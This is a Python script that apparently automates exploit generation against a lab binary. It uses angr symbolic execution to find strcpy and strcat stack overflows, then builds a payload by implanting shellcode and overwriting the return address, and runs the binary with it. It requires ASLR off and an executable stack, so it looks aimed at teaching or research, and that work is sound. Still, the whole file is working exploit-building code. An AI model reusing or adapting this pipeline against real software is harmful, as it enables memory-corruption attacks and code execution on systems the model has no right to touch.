#!/usr/bin/env python3
import subprocess
import os
import logging
import sys
import angr
import claripy
import struct


def load_shellcode(file_path):
    '''
    Load shellcode, if not found, it will run make on the directory containing
    the shellcode. Make will also build the target binary for testing.
    '''
    if not os.path.isfile(file_path):
        subprocess.call("make clean", cwd=os.path.dirname(file_path), shell=True)
    subprocess.call("make", cwd=os.path.dirname(file_path), shell=True)
    file = open(file_path, 'rb')
    shellcode = file.read()
    print(shellcode)
    return shellcode

def scan_target(file_path, target_addr):
    """
    Scans the target binary for memory vulnurabilites
    """
    logging.getLogger('angr.anager').setLevel(logging.CRITICAL)

    if not os.path.isfile(file_path):
        subprocess.call("make clean", cwd=os.path.dirname(file_path), shell=True)
    subprocess.call("make", cwd=os.path.dirname(file_path), shell=True)
    project = angr.Project(file_path,\
            load_options={'auto_load_libs':False})
    print("Architecture: " + project.arch.name + " Starting at address:  " + hex(project.entry))
    print("Endianness: " + project.arch.memory_endness)

    assert project.loader.aslr == False, "ASLR is enabled, analysis is not possible"
    assert project.loader.main_object.execstack == True, "Stack is not executable"
    assert project.loader.main_object.pic == False, "Position Independant Code\
    enabled"

    entry_block = project.factory.block(project.entry)
    entry_block.pp()
    cfg = project.analyses.CFG()

    def get_func_addr( func_name, plt=None ):
        """
        Returns function address of a non stripped binary
        """
        found = [
            addr for addr,func in cfg.kb.functions.items()
            if func_name == func.name and (plt is None or func.is_plt == plt)
            ]
        if len( found ) > 0:
            print("Found "+func_name+"'s address at "+hex(found[0])+"!")
            return found[0]
        else:
            raise Exception("No address found for function : "+func_name)
    argv = [project.filename]

    sym_arg_size = 550

    sym_arg = claripy.BVS('sym_arg', 8 * sym_arg_size)
    argv.append(sym_arg)
    argv.append("Found-the-canary")

    state = project.factory.entry_state(args=argv)

    target_addr[0] = get_func_addr("exit")
    exit_addr = get_func_addr("exit")
    strcpy_addr = get_func_addr("strcpy")
    strcat_addr = get_func_addr("strcat")

    sm = project.factory.simulation_manager(state)

    def find_vuln_func(state):
        """
        'Lambda' to simulation manager that returns true if the address of strcpy is found
        """
        if(state.ip.args[0] == strcpy_addr):
            print("Strcpy found during simulation!")
            bv_strcpy_mem = state.memory.load(state.regs.rdi, len(argv[1]))
            strcpy_src = state.solver.eval(bv_strcpy_mem, cast_to=bytes)
            return True if argv[2].encode() in strcpy_src else False
        elif(state.ip.args[0] == strcat_addr):
            print("Strcat found during simulation!")
            bv_strcat_mem = state.memory.load(state.regs.rdi, len(argv[1]))
            strcat_src = state.solver.eval(bv_strcat_mem, cast_to=bytes)
            return True if argv[2].encode() in strcat_src else False
        else:
            return False

    sm = sm.explore(find=find_vuln_func, avoid=(exit_addr,))
    found = sm.found
    result = ""
    if len(found) > 0:
        print(f"Number of possible exploits: {len(sm.found)}")
        found = sm.found[0]
        print(found.solver.eval(sm.found[0].regs.rbp, cast_to=bytes))
        result = found.solver.eval(argv[1], cast_to=bytes)
    else:
        result = "ERROR: Could not find any paths!"
    buffer_size = found.solver.eval(found.regs.rbp - found.regs.rdi, cast_to=int)
    return (result, buffer_size)


def find_index_of_emptyspace(exploit_str, length):
    """
    Find index of first location in buffer that has a sequence of
    bytes with empty null or 0x41 (A) characters of length
    """
    counter = 0
    ret_index = -1
    for (i, byte) in enumerate(exploit_str):
        if byte != 0x00 and byte != 0x41:
            counter = 0
            continue
        if counter == 0:
            ret_index = i
        counter += 1
        if counter >= length:
            return ret_index
    return -1

def clean_nulls(payload):
    """
    Removes /x00 from the payload and replaces it with /x41 (A)s
    """
    ret_str = bytearray()
    for val in payload:
        if val != 0x00:
            ret_str.append(val)
        else:
            ret_str.append(0x41)
    return ret_str

def append_shellcode(payload_bytearray):
    """
    Implants shellcode in a control-flow hijack ready payload
    """
    shellcode = load_shellcode("../tests/resources/shellcode_encoding")
    index = find_index_of_emptyspace(payload_bytearray, len(shellcode))
    if index == -1:
        print("Error: Could not find space for shellcode!")
        sys.exit()
    count = 0
    for i in range(0, len(payload_bytearray)):
        if i > index and i < index + len(shellcode):
            payload_bytearray = payload_bytearray[:i] + bytes([shellcode[count]])\
                 + payload_bytearray[i + 1:]
            count += 1
    print("Length of shellcode: " + str(len(shellcode)) + " at index: " + str(index))
    return index


def inject_ret_addr(payload_bytearray, distance_to_BP, target_addr):
    """
    Takes in payload string with shellcode and distance to the stack base pointer
    from the buffer.
    """
    print("Distance to base pointer from buffer is: " + str(distance_to_BP))
    print(f"Injecting return address: {target_addr}")
    #distance_to_BP += 8 #RBP + 8 is Ret address
    encoded_addr = struct.pack("<Q",target_addr[0])
    final_payload = payload_bytearray[:distance_to_BP] + encoded_addr +\
    encoded_addr + encoded_addr + payload_bytearray[distance_to_BP:]
    print(f'{final_payload}')
    return final_payload

import codecs
def convert_to_string(bytearr):
    '''
    Converts byte array to string, keeping in mind that converting a byte array to ASCII or utf-8
    is unsafe due to invalid bytes (0x80), etc.
    '''
    def slashescape(err):
        thebyte = err.object[err.start:err.end]
        repl = u'\\x'+hex(ord(thebyte))[2:]
        return (repl, err.end)
    codecs.register_error('slashescape', slashescape)
    return bytearr.decode('utf-8', 'slashescape')


def test_payload(payload, file_path):
    if not os.path.isfile(file_path):
        subprocess.call("make clean", cwd=os.path.dirname(file_path), shell=True)
    subprocess.call("make", cwd=os.path.dirname(file_path), shell=True)
    subprocess.call(["."+os.path.abspath(file_path),bytes(payload),"Found the canary"],shell=False)
    print("Finished running test.")

def generate_exploit():
    target_addr = [0x0]
    angr_payload = scan_target("../tests/resources/simple_buffer.o", target_addr)
    payload_bytearray = clean_nulls(angr_payload[0])
    append_shellcode(payload_bytearray)
    final_payload = inject_ret_addr(payload_bytearray, angr_payload[1], target_addr)
    return final_payload



if __name__ == "__main__":
    payload = generate_exploit()
    print(f'{payload}')
    payload_file = open("../tests/resources/payload_file.txt", "wb")
    payload_file.write(payload)
    payload_file.close()

